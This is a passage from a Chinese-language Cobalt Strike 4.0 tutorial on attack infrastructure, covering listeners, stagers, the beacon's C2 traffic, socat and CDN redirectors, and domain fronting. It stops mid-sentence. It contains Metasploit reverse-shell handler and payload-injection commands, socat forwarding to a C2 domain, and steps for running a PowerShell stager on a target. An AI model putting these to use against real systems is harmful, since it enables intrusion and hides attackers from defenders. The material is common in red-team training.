<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs53B925A8{text-align:left;margin:5pt 24pt 5pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs2D2816FE{}
			.csC48167EA{padding:0pt 5.4pt 0pt 5.4pt;border-top:none;border-right:none;border-bottom:1pt windowtext solid;border-left:none}
			.csA622D344{text-align:center;text-indent:0pt;margin:2pt 0pt 2pt 0pt}
			.csE0FE76B{text-align:left;text-indent:0pt;margin:2pt 0pt 2pt 0pt}
			.csE35A2CA7{padding:0pt 5.4pt 0pt 5.4pt;border-top:none;border-right:none;border-bottom:none;border-left:none}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="infrastructure（基础建设）"><span class="csDE05BCC">Infrastructure</span><span class="csECDA2D3">（基础建设）</span></a></h1>
		<h2 class="cs868C439D">
			<a name="Xa7f7944dab7c8b81252398d431f891baa4acd12"><span class="csB2D98684">0x01 listener management(</span><span class="cs83F14626">监听器管理</span><span class="csB2D98684">)</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">一个</span><span class="cs8926E06">listener</span><span class="cs9C1B1871">配置一个</span><span class="cs8926E06">Cobalt strike payload</span><span class="cs9C1B1871">，也只匹配一个</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">控制器。在</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">中有如下三种监听器：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs8926E06">egress</span><span class="cs9C1B1871">：入口监听器</span></li><li class="cs63189908"><span class="cs8926E06">peer-to-peer</span><span class="cs9C1B1871">：通过父级</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">使用</span></li><li class="cs63189908"><span class="cs8926E06">alias</span><span class="cs9C1B1871">：调用第三方的</span><span class="cs8926E06">payload </span><span class="cs9C1B1871">处理器</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">添加</span><span class="cs8926E06">listener</span><span class="cs9C1B1871">时确保每一个都其对应的名称，名称很重要，因为这样便于团队的其他成员去使用它。</span><span class="cs8926E06"> <img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image0.png" width="560" height="153" alt="" style="border-width:0px;" /> </span><span class="cs9C1B1871">以下列出了你可以创建的监听器类型：</span><span class="cs8926E06"> <img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image1.png" width="560" height="229" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="Xab3b39b565eba4376a732aeaafd21a04899290b"><span class="csB2D98684">0x02 stager</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">stager</span><span class="cs9C1B1871">是一个用来和</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">建立连接并下载</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，然后执行</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">的轻量级程序。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">有时候目标环境限制了执行程序的大小，所以经常会制作比较轻量级的程序来执行</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，常见的有</span><span class="cs8926E06">Powershell</span><span class="cs9C1B1871">一句话。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">stageless</span><span class="cs9C1B1871">直接省略了下载</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">的步骤，所以一般生成的</span><span class="cs8926E06">stageless</span><span class="cs9C1B1871">程序都是</span><span class="cs8926E06">exe</span><span class="cs9C1B1871">或者</span><span class="cs8926E06">dll</span><span class="cs9C1B1871">文件，相对</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">来说要大得多，而且包含了一些特征。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">CS4</span><span class="cs9C1B1871">中，</span><span class="cs8926E06">stagers</span><span class="cs9C1B1871">不再作为最流行的工具来使用，但是一些由用户驱动的攻击仍然使用</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">。</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">将不再对其控制端进行权限认证，因此</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">将变得不安全。</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">也变得脆弱了，如果它碰到了一些没有预期的情况时，可能</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">会崩溃。这些</span><span class="cs8926E06">stagers</span><span class="cs9C1B1871">之所以还保留着是因为它们是为</span><span class="cs8926E06">Metasploit</span><span class="cs9C1B1871">框架服务的。</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">的代码内容也是很容易被发现的，而且任何一种内存扫描器也应该能够发现它们。</span><span class="cs8926E06">CS</span><span class="cs9C1B1871">没有能力去在内存中清除这些特征或者是给他们添加混淆。</span></p><h2 class="cs868C439D">
			<a name="X92fb8e06ea46605e1f4ff30919d4bbd29a5abb1"><span class="csB2D98684">0x03 stager</span><span class="cs83F14626">工作流程举例</span></a></h2>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image2.png" width="560" height="227" alt="" style="border-width:0px;" /></span><span class="cs8926E06">&nbsp;</span><span class="cs9C1B1871">通过打开一个带有宏的</span><span class="cs8926E06">word</span><span class="cs9C1B1871">文档来创建子进程，然后通过打开文档执行宏代码执行</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">程序，接着</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">将通过</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">或</span><span class="cs8926E06">HTTPS</span><span class="cs9C1B1871">协议请求</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">控制器，请求的</span><span class="cs8926E06">URI</span><span class="cs9C1B1871">上会带有一个校验值，在校验值通过检查后，服务器将会将</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">传回，然后</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">将开始执行该</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果你的</span><span class="cs8926E06">stager</span><span class="cs9C1B1871">是请求到</span><span class="cs8926E06">Metasploit Framework Handler</span><span class="cs9C1B1871">上，那么你将获得一个不够健壮（</span><span class="cs8926E06">immature</span><span class="cs9C1B1871">）的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。如果你是请求到</span><span class="cs8926E06">Coballt Strike</span><span class="cs9C1B1871">的</span><span class="cs8926E06">web</span><span class="cs9C1B1871">服务上，那么你将获得一个</span><span class="cs8926E06">beacon payload</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Metasploit Framework</span><span class="cs9C1B1871">作为控制器的话，</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">需要配置为</span><span class="cs8926E06">windows meterpreter reverse http </span><span class="cs9C1B1871">或者</span><span class="cs8926E06"> reverse https</span><span class="cs9C1B1871">。</span><span class="cs8926E06">Metasploit</span><span class="cs9C1B1871">的攻击流程也是一样的，发送</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">请求，然后下载</span><span class="cs8926E06">Cobalt strike beacon payload</span><span class="cs9C1B1871">，所以</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">允许你使用一个</span><span class="cs8926E06">Metasploit Framework</span><span class="cs9C1B1871">生成的</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">来传输</span><span class="cs8926E06">Cobal Strike beacon</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">另外，</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">还可以派生</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">给</span><span class="cs8926E06">Metasploit</span><span class="cs9C1B1871">（前提是有个</span><span class="cs8926E06">beacon shell</span><span class="cs9C1B1871">）。</span></p><p class="cs3A447A38"><span class="cs9FB05234">msf &gt; use exploit/multi/handler </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload =&gt; windows/meterpreter/reverse_tcp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf exploit(handler) &gt; set lhost 192.168.1.100</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">lhost =&gt; 192.168.1.100</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf exploit(handler) &gt; set lport 5555</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">lport =&gt; 5555</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf exploit(handler) &gt; exploit</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Metasploit </span><span class="cs9C1B1871">也可以派生</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">给</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">（前提有一个</span><span class="cs8926E06">meterpreter</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs9FB05234">msf exploit(handler) &gt; &nbsp;use exploit/windows/local/payload_inject</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">　　</span><span class="cs9FB05234">msf exploit(payload_inject) &gt; &nbsp;set PAYLOAD windows/meterpreter/reverse_http</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">　　</span><span class="cs9FB05234">msf exploit(payload_inject) &gt; set DisablePayloadHandler true</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">　　</span><span class="cs9FB05234">msf exploit(payload_inject) &gt; set LHOST 192.168.229.143</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">　　</span><span class="cs9FB05234">msf exploit(payload_inject) &gt; set LPORT 1212</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">　　</span><span class="cs9FB05234">msf exploit(payload_inject) &gt; set SESSION 1</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">　　</span><span class="cs9FB05234">msf exploit(payload_inject) &gt; exploit</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样就可以从</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">传递一个</span><span class="cs8926E06">session</span><span class="cs9C1B1871">给</span><span class="cs8926E06">Metasploit</span><span class="cs9C1B1871">，也可以传递一个</span><span class="cs8926E06">session</span><span class="cs9C1B1871">从一个</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">实例给另外一个没有连接的</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">实例。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">是用</span><span class="cs8926E06">foreign listener</span><span class="cs9C1B1871">来实现配置</span><span class="cs8926E06">payload handler</span><span class="cs9C1B1871">参数的。</span></p><h2 class="cs868C439D">
			<a name="X7d8d9bf33ea145de5e17fa45e94aa651bcc52e2"><span class="csB2D98684">0x04 HTTP Beacon</span><span class="cs83F14626">介绍</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xd97d70563b540988a7e1f46dd1918b854614ff6"><span class="csD1E291E2">1. </span><span class="csD6CA00D2">配置</span><span class="csD1E291E2">HTTP Beacon:</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">可以设置连接到多个主机（域名、</span><span class="cs8926E06">IPv4</span><span class="cs9C1B1871">、</span><span class="cs8926E06">IPv6</span><span class="cs9C1B1871">都可以，</span><span class="cs8926E06">IPv6</span><span class="cs9C1B1871">需要标准格式</span><span class="cs8926E06">[::]</span><span class="cs9C1B1871">）</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image3.png" width="560" height="354" alt="" style="border-width:0px;" /> </span><span class="cs9C1B1871">配置代理</span><span class="cs8926E06">(</span><span class="cs9C1B1871">可选项</span><span class="cs8926E06">)</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image4.png" width="560" height="362" alt="" style="border-width:0px;" /> </span><span class="cs9C1B1871">配置完毕后在</span><span class="cs8926E06">Attacks - Web Drive-by - Scripted Web Delivery</span><span class="cs9C1B1871">菜单配置</span><span class="cs8926E06">web</span><span class="cs9C1B1871">服务：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image5.png" width="499" height="408" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">点击</span><span class="cs8926E06">launch</span><span class="cs9C1B1871">后会生成</span><span class="cs8926E06">powershell</span><span class="cs9C1B1871">一句话，复制到目标主机运行这个</span><span class="cs8926E06">powershell</span><span class="cs9C1B1871">脚本：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image6.png" width="347" height="181" alt="" style="border-width:0px;" /><br/>Cobal Strike</span><span class="cs9C1B1871">将会与</span><span class="cs8926E06">http beacon</span><span class="cs9C1B1871">建立连接：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image7.png" width="560" height="188" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="Xc9ef02d080e0c2a400dae6b761bb19cd21a62ff"><span class="csD1E291E2">2. HTTP Beacon</span><span class="csD6CA00D2">传输过程</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">场景举例：一个</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">控制器、一个运行了</span><span class="cs8926E06">http beacon</span><span class="cs9C1B1871">的目标主机</span></p><p class="cs40DD2BC9"><span class="cs8926E06">http beacon </span><span class="cs9C1B1871">向</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">控制器发送</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">请求，判断有无内容返回：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">(1) </span><span class="cs9C1B1871">若</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">无内容返回，那么</span><span class="cs8926E06">beacon</span><span class="cs9C1B1871">将会进行睡眠状态，之后</span><span class="cs8926E06">beacon</span><span class="cs9C1B1871">将会在一开始配置好的时间之后重新请求</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">。</span><span class="cs8926E06"><br/>(2) </span><span class="cs9C1B1871">当</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">返回了请求内容时，内容将会是一些被加密过的需要执行的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs8926E06">http beacon</span><span class="cs9C1B1871">执行完</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">之后需要将结果回传给</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">时，它将使用</span><span class="cs8926E06">POST</span><span class="cs9C1B1871">请求，请求内容为</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">执行的结果被加密后的密文。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">如果</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">执行后没有输出结果，那么将不会发送</span><span class="cs8926E06">POST</span><span class="cs9C1B1871">请求。</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">HTTPS Beacon</span><span class="csE3F655E4">的用法和</span><span class="cs5BEC2C28">HTTP</span><span class="csE3F655E4">一样，只是</span><span class="cs5BEC2C28">HTTPS</span><span class="csE3F655E4">使用了</span><span class="cs5BEC2C28">SSL</span><span class="csE3F655E4">证书而已</span></p><h2 class="cs868C439D">
			<a name="X153566b52a188f3fa6410d868c3098067a582d6"><span class="csB2D98684">0x05 Redirector(</span><span class="cs83F14626">重定向器</span><span class="csB2D98684">)</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X3f6b42985edc8d8469a3b0d9791c776bd8e7b89"><span class="csD1E291E2">1. </span><span class="csD6CA00D2">介绍</span><span class="csD1E291E2">redirector</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image8.png" width="560" height="556" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">一般</span><span class="cs8926E06">redirector</span><span class="cs9C1B1871">设置在你的</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">实例和你的目标网络之间，</span><span class="cs8926E06">redirector</span><span class="cs9C1B1871">会将流量转发至你的</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">实例。</span><span class="cs8926E06">redirector</span><span class="cs9C1B1871">存在的意义是为了模糊你的</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">的</span><span class="cs8926E06">Team server</span><span class="cs9C1B1871">的位置，这相当于为你的</span><span class="cs8926E06">Cobal Strike team server</span><span class="cs9C1B1871">设置了多个</span><span class="cs8926E06">IP</span><span class="cs9C1B1871">地址。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">你可以使用</span><span class="cs9FB05234">iptables</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">socat</span><span class="cs9C1B1871">或者其他工具去转发流量到你的</span><span class="cs8926E06">Cobal Strike Team server</span><span class="cs9C1B1871">。命令如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">socat TCP4-LISTEN:80,fork TCP4:[team server]:80</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">你也可以启用一个</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">或者</span><span class="cs8926E06">Nginx</span><span class="cs9C1B1871">服务作为你的</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">的反向代理来替代</span><span class="cs8926E06">redirector</span><span class="cs9C1B1871">的作用。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">你还可以使用</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">，比如</span><span class="cs8926E06">Amazon</span><span class="cs9C1B1871">的</span><span class="cs8926E06">Cloudfront</span><span class="cs9C1B1871">来作为一个</span><span class="cs8926E06">redirector</span><span class="cs9C1B1871">转发</span><span class="cs8926E06">https</span><span class="cs9C1B1871">流量到你的</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">。</span></p><h3 class="cs868C439D">
			<a name="X7047252975eca9f94d821db3e387e0fea33c053"><span class="csD1E291E2">2. </span><span class="csD6CA00D2">使用</span><span class="csD1E291E2">socat</span><span class="csD6CA00D2">实现一个</span><span class="csD1E291E2">redirector</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">环境说明：</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">c2</span><span class="cs9C1B1871">：</span><span class="cs8926E06">secure.losenolove.com</span></li><li class="cs24C36B3"><span class="cs8926E06">redirector</span><span class="cs9C1B1871">：</span><span class="cs8926E06">54.158.156.250, 34.207.207.199.101</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234"># </span><span class="cs7FFD2630">在</span><span class="cs9FB05234">54.158.156.250</span><span class="cs7FFD2630">上执行如下命令</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">先安装</span><span class="cs9FB05234">socat</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sudo apt-get update &amp;&amp; apt-get install socat</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#socat</span><span class="cs7FFD2630">转发</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sudo socat TCP4-LISTEN:80,fork TCP4:secure.losenolove.com:80</span></li><li class="cs24C36B3"><span class="cs9C1B1871">直接访问</span><span class="cs8926E06"><a class="cs508254C" href="http://54.158.156.250/bar"><span class="cs4B51D5E4">http://54.158.156.250/bar</span></a></span><span class="cs8926E06"> </span><span class="cs9C1B1871">，然后在</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">web log</span><span class="cs9C1B1871">上就可以看到访问记录了</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">配置</span><span class="cs8926E06">redirectors</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">在</span><span class="cs9FB05234">HTTP HOSTS</span><span class="cs9C1B1871">里添加</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/2.Infrastructure/infrastructure%ef%bc%88%e5%9f%ba%e7%a1%80%e5%bb%ba%e8%ae%be%ef%bc%89_files/image9.png" width="560" height="577" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="Xd8cf4b747a01beddaef165bd0d39c218c5472c0"><span class="csD1E291E2">3. </span><span class="csD6CA00D2">使用</span><span class="csD1E291E2">CDN</span><span class="csD6CA00D2">实现一个</span><span class="csD1E291E2">redirector</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">CND Redirector</span><span class="cs9C1B1871">要求如下</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">网站使用</span><span class="cs8926E06">SSL</span><span class="cs9C1B1871">证书</span></li><li class="cs63189908"><span class="cs9C1B1871">配置允许使用</span><span class="cs8926E06">HTTP POST</span><span class="cs9C1B1871">和</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">方法</span></li><li class="cs63189908"><span class="cs9C1B1871">避免出现问题，需要在</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">配置文件里设置允许使用</span><span class="cs8926E06">HTTP GET</span><span class="cs9C1B1871">方法下载任务和回传数据给</span><span class="cs8926E06">Cobal Strike</span></li><li class="cs63189908"><span class="cs9C1B1871">禁用所有缓存选项（避免数据不转发到服务器）</span></li><li class="cs63189908"><span class="cs9C1B1871">清楚地知道你传输的内容</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs53B925A8"><span class="cs9C1B1871">注：由于某些</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">（比如</span><span class="cs8926E06">Cloudfront</span><span class="cs9C1B1871">会修改</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">）在传输过程中可能会对</span><span class="cs8926E06">HTTP header</span><span class="cs9C1B1871">头部的内容进行修改。这本来没什么影响除非你的</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">设置了通过</span><span class="cs8926E06">HTTP headr</span><span class="cs9C1B1871">的</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">字段来传输数据给</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">。所以对于</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">转发的内容你得清楚地知道。</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">CDN Redirector</span><span class="cs9C1B1871">有一个比较好的东西需要了解，那就是</span><span class="cs8926E06">Domain Fronting(</span><span class="cs9C1B1871">域前置</span><span class="cs8926E06">)</span><span class="cs9C1B1871">，可以参考深信服社区的一篇文章</span><span class="cs8926E06"><a class="cs508254C" href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=71715"><span class="cs4B51D5E4">Domain fronting</span><span class="cs1C2E50E7">域名前置网络攻击技术</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">实际效果是</span><span class="cs8926E06">beacon</span><span class="cs9C1B1871">向一个信誉度比较高的网站发送请求时，设置</span><span class="cs8926E06">HTTP header</span><span class="cs9C1B1871">里的</span><span class="cs8926E06">Host</span><span class="cs9C1B1871">为我们在</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">配置完毕后获得的一个</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">的二级域名（比如</span><span class="cs8926E06">xxx.cloudfront.net</span><span class="cs9C1B1871">），然后这个</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">请求就会转发到</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">的地址，再转发到</span><span class="cs8926E06">C2</span><span class="cs9C1B1871">的地址。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果目标主机使用了代理服务器向外界发送</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">请求，那么在使用</span><span class="cs8926E06">Domain Fronting</span><span class="cs9C1B1871">时，代理服务器可能会检测到请求的</span><span class="cs8926E06">URI</span><span class="cs9C1B1871">和</span><span class="cs8926E06">Host</span><span class="cs9C1B1871">中的内容不一致，然后就会自动将</span><span class="cs8926E06">Host</span><span class="cs9C1B1871">的内容替换为</span><span class="cs8926E06">URI</span><span class="cs9C1B1871">中的域名，接着该请求就会发送给那个信誉度比较高的网站。然而如果你使用了</span><span class="cs8926E06">HTTPS</span><span class="cs9C1B1871">，一般就不会出现这个问题。（有些企业会对</span><span class="cs8926E06">HTTPS</span><span class="cs9C1B1871">流量进行监测，如果被监测发现了，</span><span class="cs8926E06">Host</span><span class="cs9C1B1871">头还是有可能会被纠正）</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然而现在有些</span><span class="cs8926E06">CDN</span><span class="cs9C1B1871">自己开始对</span><span class="cs8926E06">SSL</span><span class="cs9C1B1871">流量进行监测去避免</span><span class="cs8926E06">Domain Fronting</span><span class="cs9C1B1871">。但是使用</span><span class="cs8926E06">SSL</span><span class="cs9C1B1871">协议传输，严格地说是使用</span><span class="cs8926E06">TLS</span><span class="cs9C1B1871">协议传输的数据包中</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">协议的外层有一层</span><span class="cs8926E06">SNI</span><span class="cs9C1B1871">（</span><span class="cs8926E06">Server Name Indication</span><span class="cs9C1B1871">），</span><span class="cs8926E06">SNI</span><span 